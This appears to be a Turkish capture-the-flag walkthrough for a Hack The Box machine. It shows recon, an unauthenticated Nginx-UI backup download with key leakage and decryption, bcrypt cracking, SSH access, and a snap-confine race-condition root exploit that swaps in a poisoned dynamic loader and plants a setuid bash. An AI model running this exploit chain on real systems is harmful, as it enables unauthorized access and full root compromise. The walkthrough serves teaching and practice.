@@ -1,0 +1,252 @@
+## Keşif
+
+### Nmap
+
+```
+nmap -sCV ip
+```
+
+İki port açık: 22 (SSH) ve 80 (HTTP, nginx 1.24.0). HTTP doğrudan `http://snapped.htb/`'e yönlendiriyor, hosts dosyasına ekliyoruz.
+
+```
+echo "10.129.242.192 snapped.htb" | sudo tee -a /etc/hosts
+```
+
+### Subdomain Fuzzing
+
+```
+ffuf -w /usr/share/wordlists/amass/bitquark_subdomains_top100K.txt \
+     -u http://FUZZ.snapped.htb -ic
+```
+
+`admin` subdomain'i çıkıyor. Onu da hosts'a ekliyoruz:
+
+```
+echo "ip admin.snapped.htb" | sudo tee -a /etc/hosts
+```
+
+`http://admin.snapped.htb` açıldığında Nginx-UI login sayfası geliyor. Default credential yok, devam ediyoruz.
+
+### API Endpoint Fuzzing
+
+Login sayfası açılırken `/api/install` endpoint'i çağrılıyor. Buradan yola çıkıp API'yi fuzz'lıyoruz:
+
+```
+ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \
+     -u http://admin.snapped.htb/api/FUZZ -ic
+```
+
+İki ilginç sonuç:
+- `/api/backup` → **200**
+- `/api/settings` → 403
+
+---
+
+## Foothold — CVE-2026-27944 (Nginx-UI Unauthenticated Backup)
+
+Nginx-UI 2.3.2 ve altı, `/api/backup` endpoint'ine authentication olmadan erişime izin veriyor. Ayrıca response header'ında backup dosyasını decrypt etmek için gereken key/IV'yi düz metin olarak gönderiyor.
+
+```
+curl -OJ -v http://admin.snapped.htb/api/backup
+```
+
+Response header'ına bakıyoruz:
+
+```
+X-Backup-Security: Uggi+bPybhVny2dV+MaAVAkjSrzQBCjWFhbsenNiVJA=:Jky/YQ0ISOX3gcTE9lj7zQ==
+```
+
+Format `base64(key):base64(iv)`. Decrypt işlemi için hex'e çeviriyoruz:
+
+```bash
+key=$(echo 'Uggi+bPybhVny2dV+MaAVAkjSrzQBCjWFhbsenNiVJA=' | base64 -d | xxd -p -c 256)
+iv=$(echo 'Jky/YQ0ISOX3gcTE9lj7zQ==' | base64 -d | xxd -p)
+```
+
+Zip'i açıp içindeki şifreli `nginx-ui.zip`'i decrypt ediyoruz:
+
+```bash
+unzip -d backup backup-*.zip
+cd backup
+openssl enc -aes-256-cbc -d -in nginx-ui.zip -out nginxui_decrypted.zip -K $key -iv $iv
+unzip nginxui_decrypted.zip
+```
+
+`database.db` çıkıyor. SQLite ile kullanıcı tablosuna bakıyoruz:
+
+```
+sqlite3 database.db "select * from users;"
+```
+
+İki bcrypt hash var. İkincisi kırılıyor:
+
+```
+hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt
+```
+
+```
+$2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq:*
+```
+
+Credentials: `jonathan:*` — SSH'ta da aynı şifreyi kullanıyor:
+
+```
+ssh jonathan@snapped.htb
+```
+
+User flag elimizde.
+
+---
+
+## Yetki Yükseltme — CVE-2026-3888 (snapd TOCTOU Race Condition)
+
+### Zafiyet Analizi
+
+```
+snap --version
+# snap 2.63.1+24.04 (vulnerable < 2.74.2)
+```
+
+Ubuntu 24.04'te `snap-confine` SUID root binary'si, bir snap çalıştırılmadan önce sandbox ortamını kuruyor. Bu kurulumun bir parçası olarak "mimic" adı verilen bir işlem yapıyor — read-only dosya sistemi dizinlerinin yazılabilir kopyalarını oluşturuyor. `/usr/lib/x86_64-linux-gnu` için bu süreç şöyle işliyor:
+
+```
+1. mount --bind /usr/lib/x86_64-linux-gnu → /tmp/.snap/usr/lib/x86_64-linux-gnu
+2. mount -t tmpfs → /usr/lib/x86_64-linux-gnu  (namespace içinde)
+3. /tmp/.snap/usr/lib/x86_64-linux-gnu içindeki her entry için:
+       mount --bind entry → /usr/lib/x86_64-linux-gnu/entry
+4. umount /tmp/.snap/usr/lib/x86_64-linux-gnu
+```
+
+1. ve 3. adım arasında `/tmp/.snap/usr/lib/x86_64-linux-gnu` içeriği değiştirilebilirse, 3. adımda snap-confine bizim dosyalarımızı root olarak namespace'e bind-mount ediyor. Klasik TOCTOU.
+
+### Ön Koşul: systemd-tmpfiles
+
+```bash
+systemctl cat systemd-tmpfiles-clean.timer
+# OnBootSec=1m
+# OnUnitActiveSec=1m
+
+cat /usr/lib/tmpfiles.d/tmp.conf
+# D /tmp 1777 root root 4m
+```
+
+Timer her 1 dakikada bir çalışıyor, `/tmp` altındaki 4 dakikadan eski dosyaları temizliyor. Bu, `.snap` dizininin periyodik olarak silinmesi anlamına geliyor. Silindiğinde `/tmp` world-writable olduğundan bizim recreate ettiğimiz dizin bizim kullanıcımıza ait oluyor.
+
+### Race'i Güvenilir Kazanmak
+
+Normal race condition anında kazanmak çok zor. Exploit helper `firefox_2404` şu tekniği kullanıyor:
+
+- snap-confine'ın stderr'ını `SO_RCVBUF=1, SO_SNDBUF=1` ile açılmış bir AF_UNIX socket'e yönlendiriyor
+- Buffer son derece küçük olduğundan snap-confine her `write()` çağrısında helper `read()` yapana kadar bloklanıyor
+- Helper byte byte okuyor, böylece snap-confine'ı single-step ediyor
+- Trigger mesajı (`dir:"/tmp/.snap/usr/lib/x86_64-linux-gnu"`) görününce — snap-confine bir write ortasında bloklu — `renameat2(RENAME_EXCHANGE)` ile dizinleri atomik olarak swap ediyoruz
+- Sonra helper okumaya devam edip snap-confine'ı unblock ediyor
+- snap-confine artık bizim kontrolümüzdeki dizinden kütüphaneleri bind-mount ediyor
+
+### Exploit Adımları
+
+#### Terminal 1 — Firefox Sandbox'a Gir
+
+```bash
+env -i SNAP_INSTANCE_NAME=firefox \
+  /usr/lib/snapd/snap-confine --base core22 \
+  snap.firefox.hook.configure /bin/bash
+
+cd /tmp
+echo $$   # Bu PID'i not et, diyelim ki 4357
+```
+
+Bu process'i açık tut. Namespace bu sayede ayakta kalıyor.
+
+#### Terminal 1 — .snap Silinmesini Bekle
+
+`.snap` dizini oluşturuldu, ama biz dokunmuyoruz. Silinene kadar `/tmp`'yi aktif tutuyoruz:
+
+```bash
+while test -d ./.snap; do touch ./; sleep 1; done
+echo "snap gitti, devam edebiliriz"
+```
+
+Yaklaşık 4-5 dakika sürüyor.
+
+#### Terminal 2 — Namespace'i Yıkıp Race'i Başlat
+
+```bash
+# /proc/SANDBOX_PID/cwd, sandbox'ın /tmp'sine giriş sağlıyor
+# (host'taki /tmp/snap-private-tmp/snap.firefox/tmp/ 700 root:root ama bu bypass ediyor)
+cd /proc/4357/cwd
+
+# Cached namespace'i yıkıyoruz (--base snapd geçersiz olduğundan mount sırasında fail ediyor)
+systemd-run --user --scope --unit=snap.d$(date +%s) -- \
+  env -i SNAP_INSTANCE_NAME=firefox \
+  /usr/lib/snapd/snap-confine --base snapd \
+  snap.firefox.hook.configure /nonexistent 2>/dev/null || true
+
+# Race helper'ı başlat
+~/firefox_2404 ~/librootshell.so
+```
+
+Çıktıda şunu görene kadar bekle:
+
+```
+[!] TRIGGER DETECTED! Swapping .exchange...
+[+] SWAP DONE!
+```
+
+Bu terminal'i kapat**ma** — process hayatta kaldıkça namespace da yaşıyor.
+
+#### Terminal 3 — Dynamic Loader'ı Zehirle
+
+```bash
+# Race helper'ın başlattığı inner shell PID'i
+PID=$(cat /proc/4357/cwd/race_pid.txt)
+
+# Sahiplik doğrulama (jonathan:jonathan olmalı)
+stat -c '%U:%G' /proc/$PID/root/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+
+# Poisoned namespace root'una gir
+cd /proc/$PID/root
+
+# Busybox'ı /tmp/sh olarak ekle (static binary, ld-linux'a ihtiyaç duymaz)
+cp /usr/bin/busybox ./tmp/sh
+
+# ld-linux'u shellcode ile değiştir
+# librootshell.so: setreuid(0,0) → setregid(0,0) → execve("/tmp/sh")
+cat ~/librootshell.so > ./usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+```
+
+#### Terminal 3 — Root Trigger
+
+```bash
+env -i SNAP_INSTANCE_NAME=firefox \
+  /usr/lib/snapd/snap-confine --base core22 \
+  snap.firefox.hook.configure /usr/lib/snapd/snap-confine
+```
+
+snap-confine SUID root olduğundan kernel `PT_INTERP`'i okuyup bizim shellcode'umuzu dynamic loader olarak `euid=0` ile çalıştırıyor. Busybox ash açılıyor:
+
+```
+# id
+uid=0(root) gid=1000(jonathan) groups=1000(jonathan)
+```
+
+#### Sandbox'tan Kaç
+
+AppArmor profili `/var/snap/firefox/common/` yazımına izin veriyor:
+
+```bash
+cp /bin/bash /var/snap/firefox/common/bash
+chmod 04755 /var/snap/firefox/common/bash
+exit
+```
+
+#### Tam Root
+
+```bash
+/var/snap/firefox/common/bash -p
+bash-5.1# id
+# uid=1000(jonathan) euid=0(root)
+
+cat /root/root.txt
+# *
+```
